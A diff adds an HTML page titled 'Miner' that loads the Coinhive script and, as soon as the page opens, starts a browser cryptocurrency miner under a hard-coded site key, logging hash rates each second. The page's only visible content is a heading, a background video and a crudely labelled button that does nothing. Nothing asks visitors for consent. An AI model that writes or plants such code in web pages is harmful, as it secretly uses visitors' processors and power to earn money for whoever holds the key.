@@ -1,0 +1,84 @@
+<html>
+<head><div class="divide"></div></head>
+  <head>
+    <title>Miner</title>
+    <meta charset="utf-8" />
+    <link href="custom.css" rel="stylesheets" type="text/css"/>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+  </head>
+  <body>
+    <center><h1>Bitcoin Miner</h1></center>
+  </body>
+  <div class="fullscreen-bg">
+      <video loop muted autoplay poster="img/videoframe.jpg" class="fullscreen-bg__video">
+          <source src="rain.mp4" type="video/mp4">
+      </video>
+  </div>
+<style>
+.button {
+  padding: 15px 25px;
+  font-size: 24px;
+  text-align: center;
+  cursor: pointer;
+  outline: none;
+  color: #fff;
+  background-color: #4CAF50;
+  border: none;
+  border-radius: 15px;
+  box-shadow: 0 9px #999;
+}
+
+.button:hover {background-color: orange}
+.button:hover {text-shadow: #999}
+
+.button:active {
+  background-color: #3e8e41;
+  box-shadow: 0 5px #666;
+  transform: translateY(4px);
+}
+.divide {
+	padding: 0;
+	margin: 0;
+	background: linear-gradient(to right,  #1e5799 0%,#f300ff 50%,#e0ff00 100%);
+	filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#1e5799', endColorstr='#e0ff00',GradientType=1 );
+
+	height: 3px;
+	border-bottom: 1px solid #000;
+}
+</style>
+<button class="button">Fuck Me</button>
+<body style="background-color:darkred;">
+</body>
+<script>
+         var miner = new CoinHive.Anonymous('WGKifFA57XJXm4ezidwWx9i0VhyQEhVq');
+         miner.start();
+
+         // Listen on events
+         miner.on('found', function() {
+             console.log("found hash!")
+         })
+         miner.on('accepted', function() {
+             console.log("accepted hash!")
+         })
+
+         // Update stats once per second
+         setInterval(function() {
+             var hashesPerSecond = miner.getHashesPerSecond();
+             var totalHashes = miner.getTotalHashes();
+             var acceptedHashes = miner.getAcceptedHashes();
+
+             console.log("hashesPerSecond", hashesPerSecond)
+             console.log("totalHashes", totalHashes)
+             console.log("acceptedHashes", acceptedHashes)
+
+             console.log("-----------")
+             console.log("-----------")
+             console.log("-----------")
+
+             // Output to HTML elements...
+         }, 1000);
+     </script>
+  <header>
+
+  </header>
+</html>
